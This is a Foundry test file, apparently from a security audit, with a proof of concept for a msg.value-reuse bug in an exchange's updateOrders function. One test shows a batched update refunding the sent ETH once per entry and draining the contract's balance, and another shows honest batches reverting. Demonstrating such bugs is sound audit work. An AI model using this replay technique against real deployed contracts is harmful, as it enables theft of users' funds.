// SPDX-License-Identifier: BUSL-1.1
pragma solidity >=0.8;

import {BaseSetup} from "../OrderbookBaseSetup.sol";
import {Orderbook} from "../../../src/exchange/orderbooks/Orderbook.sol";
import {ExchangeOrderbook} from "../../../src/exchange/libraries/ExchangeOrderbook.sol";
import {IMatchingEngine} from "../../../src/exchange/interfaces/IMatchingEngine.sol";
import {console} from "forge-std/console.sol";

/// Slither `msg-value-loop` on MatchingEngine._updateOrder, triaged and confirmed.
///
/// `_updateOrder` reads `uint256 leftover = msg.value` and refunds whatever is
/// left to msg.sender (MatchingEngine.sol:1541-1545). `updateOrders` calls it once
/// per array entry in a loop (MatchingEngine.sol:1578-1583) — and `msg.value` is a
/// transaction constant, so EVERY iteration sees the full amount again and issues
/// its own refund.
///
/// On a pair whose tokens are not WETH, `_createOrder` deposits nothing, so
/// `leftover` is still the whole `msg.value` when it reaches the refund. N entries
/// therefore pay out N x msg.value against a single msg.value received; the excess
/// comes out of whatever ETH the contract is holding.
contract PoCUpdateOrdersValueReplay is BaseSetup {
    uint256 constant PRICE = 100e8;

    function _list() internal {
        matchingEngine.addPair(
            address(token1),
            address(token2),
            PRICE,
            0,
            address(token1),
            ExchangeOrderbook.MatchingMode.PriceTimePriority
        );
        book = Orderbook(payable(orderbookFactory.getPair(address(token1), address(token2))));
    }

    function test_PoC_updateOrders_refundsMsgValueOncePerEntry() public {
        _list();

        // Three resting asks the attacker can legitimately "update".
        uint32[3] memory ids;
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(trader1);
            IMatchingEngine.OrderResult memory r =
                matchingEngine.limitSell(address(token1), address(token2), PRICE, 1e18, true, 2, trader1);
            ids[i] = r.id;
        }

        // Any ETH the engine is holding is what gets drained. Its receive() accepts
        // ETH from WETH, so a balance here is a state the contract really reaches;
        // dealt directly to keep the PoC to the one issue under test.
        vm.deal(address(matchingEngine), 10 ether);
        uint256 engineBefore = address(matchingEngine).balance;

        IMatchingEngine.CreateOrderInput[] memory batch = new IMatchingEngine.CreateOrderInput[](3);
        for (uint256 i = 0; i < 3; i++) {
            batch[i] = IMatchingEngine.CreateOrderInput({
                base: address(token1),
                quote: address(token2),
                isBid: false,
                isLimit: true,
                orderId: ids[i],
                price: PRICE,
                amount: 1e18,
                n: 2,
                recipient: trader1
            });
        }

        uint256 sent = 1 ether;
        vm.deal(trader1, sent);
        uint256 attackerBefore = trader1.balance;

        vm.prank(trader1);
        matchingEngine.updateOrders{value: sent}(batch);

        uint256 attackerAfter = trader1.balance;
        uint256 engineAfter = address(matchingEngine).balance;

        console.log("entries in batch          :", batch.length);
        console.log("msg.value sent (wei)      :", sent);
        console.log("attacker balance before   :", attackerBefore);
        console.log("attacker balance after    :", attackerAfter);
        console.log("engine ETH drained (wei)  :", engineBefore - engineAfter);

        // One msg.value in, three refunds out: the attacker ends up ahead by two
        // extra refunds, taken from the engine's own balance.
        assertEq(attackerAfter, attackerBefore + 2 * sent, "attacker gained 2 extra refunds");
        assertEq(engineBefore - engineAfter, 2 * sent, "engine lost the difference");
    }

    /// The same defect with no pre-existing balance: the contract cannot pay the
    /// second refund, so an honest multi-entry update simply reverts.
    function test_PoC_updateOrders_revertsWhenEngineHoldsNoEth() public {
        _list();

        uint32[2] memory ids;
        for (uint256 i = 0; i < 2; i++) {
            vm.prank(trader1);
            IMatchingEngine.OrderResult memory r =
                matchingEngine.limitSell(address(token1), address(token2), PRICE, 1e18, true, 2, trader1);
            ids[i] = r.id;
        }

        assertEq(address(matchingEngine).balance, 0, "engine holds nothing");

        IMatchingEngine.CreateOrderInput[] memory batch = new IMatchingEngine.CreateOrderInput[](2);
        for (uint256 i = 0; i < 2; i++) {
            batch[i] = IMatchingEngine.CreateOrderInput({
                base: address(token1),
                quote: address(token2),
                isBid: false,
                isLimit: true,
                orderId: ids[i],
                price: PRICE,
                amount: 1e18,
                n: 2,
                recipient: trader1
            });
        }

        vm.deal(trader1, 1 ether);
        vm.prank(trader1);
        (bool ok,) = address(matchingEngine).call{value: 1 ether}(
            abi.encodeWithSelector(matchingEngine.updateOrders.selector, batch)
        );

        assertFalse(ok, "second refund cannot be paid, so the batch reverts");
    }
}
